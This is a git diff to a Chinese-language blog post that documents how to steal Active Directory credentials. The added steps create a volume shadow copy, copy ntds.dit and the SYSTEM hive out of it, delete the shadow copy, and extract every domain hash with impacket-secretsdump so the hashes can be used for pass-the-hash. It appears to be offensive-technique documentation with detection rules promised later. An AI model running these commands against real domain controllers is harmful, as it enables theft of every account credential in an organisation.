@@ -17,8 +17,36 @@ Ntds.dit文件是一个数据库文件，存在于C:\Windows\System32\ntds.dit�
 是Windows本地的白名单工具，存在于C:\Windows\System32\vssadmin.exe
 能够显示当前卷卷影副本备份以及所有已安装的卷影副本编写器和提供程序。
 ## 创建C盘的卷影副本
+使用以下命令（登录权限为域管理员权限）
 {% highlight ruby %}
 vssadmin create shadow /for=c:
 {% endhighlight %}
 ![1](/assets/vssadmin.png)
-### Welcome
+## 从卷影中检索并复制ntds.dit文件到指定目录下
+使用以下命令（登录权限为域管理员权限）：
+{% highlight ruby %}
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\ntds.dit C:\test\ntds.dit
+{% endhighlight %}
+![2](/assets/vssadmin2.png)
+## 从注册表或卷影中复制SYSTEM文件
+由于提取文件中的hash需要密钥，所以需要转储SYSTEM。这里从卷影副本中复制，使用以下命令：
+{% highlight ruby %}
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SYSTEM C:\test\SYSTEM
+{% endhighlight %}
+![3](/assets/vssadmin3.png)
+## 删除创建的卷影副本
+使用以下命令：
+{% highlight ruby %}
+vssadmin delete shadows /shadow={d8a08578-1869-473b-bc19-fa96da667413}
+{% endhighlight %}
+![4](/assets/vssadmin4.png)
+注：这里使用的卷影ID值为第一步中创建卷影副本时的ID值
+## 读取ntds.dit文件中的hash值
+使用kali中存在的工具Impacket，Imoacket是一组python脚本，可用于执行各种任务，包括提取NTDS文件的内容。
+将转储后的ntds和SYSTEM文件放到某一目录下后（这里放到桌面下）使用以下命令：
+{% highlight ruby %}
+impacket-secretsdump -system /root/Desktop/SYSTEM -ntds /root/Desktop/ntds.dit LOCAL
+{% endhighlight %}
+可以看到已经提取出当前DC中所有的账户hash值，之后可以使用这些hash值进行hash传递。
+![5](/assets/vssadmin5.png)
+### 检测规则后续补充
